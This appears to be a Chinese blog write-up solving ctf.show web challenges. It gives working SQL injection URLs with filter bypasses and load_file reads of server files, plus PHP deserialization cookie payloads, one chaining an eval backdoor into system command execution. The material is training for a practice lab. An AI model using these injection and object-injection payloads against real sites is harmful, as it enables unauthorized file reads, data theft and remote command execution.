<p><img src="/../images/CTF-web-2.assets/image-20230113000612442.png" alt="image-20230113000612442"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=print_r(glob(&quot;*&quot;));</span><br></pre></td></tr></table></figure>

<p><img src="/../images/CTF-web-2.assets/image-20230113000706094.png" alt="image-20230113000706094"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;);</span><br></pre></td></tr></table></figure>

<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c </span>= <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">sleep</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="keyword">switch</span><span class="title function_ invoke__"> </span>(<span class="variable">$c</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;$url&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;@A@&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6000000</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$url</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>读代码，get传参555555确实能出，但是要等这么多秒，显然这里传?c&#x3D;3这样不会break，而是执行下两个case，即可出$url</p>
<p><img src="/../images/CTF-web-2.assets/image-20230113002156798.png" alt="image-20230113002156798"></p>
<p>访问页面，发现又是个sql注入</p>
<p><img src="/../images/CTF-web-2.assets/image-20230113002336531.png" alt="image-20230113002336531"></p>
<p>该过滤可以通过反引号绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b51e6ea0-6193-4ecf-adc6-da0908921950.challenge.ctf.show/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=database()</span><br></pre></td></tr></table></figure>

<p>注意query需要先索引错误，即-1，后面联合查询才能显示，下为表名</p>
<p><img src="/../images/CTF-web-2.assets/image-20230113003217661.png" alt="image-20230113003217661"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b51e6ea0-6193-4ecf-adc6-da0908921950.challenge.ctf.show/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=%27content%27</span><br></pre></td></tr></table></figure>

<p><img src="/../images/CTF-web-2.assets/image-20230113003525283.png" alt="image-20230113003525283"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b51e6ea0-6193-4ecf-adc6-da0908921950.challenge.ctf.show/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/content</span><br></pre></td></tr></table></figure>

<p><img src="/../images/CTF-web-2.assets/image-20230113003742755.png" alt="image-20230113003742755"></p>
<p>没有，tnnd，在一开始的文件包含中的<code>secret.php</code>中，这里使用mysql的file_load()函数调用本地文件（&#x3D;&#x3D;md这个路径不对的话没有回显，必须是&#x2F;var&#x2F;www&#x2F;html&#x2F;secret.php&#x3D;&#x3D;）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b51e6ea0-6193-4ecf-adc6-da0908921950.challenge.ctf.show/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/load_file(%27/var/www/html/secret.php%27)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/CTF-web-2.assets/image-20230113004915360.png" alt="image-20230113004915360"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b51e6ea0-6193-4ecf-adc6-da0908921950.challenge.ctf.show/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/load_file(%27/real_flag_is_here%27)</span><br></pre></td></tr></table></figure>

<p>那直接调出real_flag_is_here.php即可</p>
<p><img src="/../images/CTF-web-2.assets/image-20230113005221207.png" alt="image-20230113005221207"></p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个源码读的，好像直接传参就行了啊，也没有啥反序列化</p>
<p><code>http://c0af7103-46c3-40ab-978e-c32c02f0d1dd.challenge.ctf.show/?username=xxxxxx&amp;password=xxxxxx</code>直接就出了</p>
<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><p>该题与上题区别仅仅在于</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ctfShowUser类中，login函数登陆上去后，并不会修改$isVip，因此我们需要在后面的反序列化中，使用Cookie将user上序列化后的类，并在类中修改$isVip&#x3D;True</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=True;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="comment">#需要url编码绕过Cookie的‘限制</span></span><br></pre></td></tr></table></figure>

<p>运行得到<code>O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></p>
<p>正常get传参<code>?username=xxxxxx&amp;password=xxxxxx</code>，然后构造Cookie传入<code>user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></p>
<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            if($this-&gt;username!==$this-&gt;password)&#123;</span><br><span class="line">                    echo &quot;your flag is &quot;.$flag;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>没意思，修改了一个判断，必须要求username!&#x3D;&#x3D;password才能获得flag，重新生成反序列化即可</p>
<h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><p>同样是简单的反序列化，通过创建类时候的魔术方法控制函数流，劫持到backDoor()中，进行命令执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析代码，我们只需要在__construct()函数中，控制生成的类为backDoor，这样在销毁类的时候执行__destruct()函数时候，就会调用backDoor::getInfo()，然后将backDoor的$code改成我们的命令即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=True;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:<code>http://50208168-eb9f-4234-81f7-6bf2ca619336.challenge.ctf.show/?username=1&amp;password=2</code>同时修改Cookie为<code>user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A1%3A%221%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A1%3A%222%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A1%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A19%3A%22system%28%27tac+fla%2A%27%29%3B%22%3B%7D%7D</code></p>
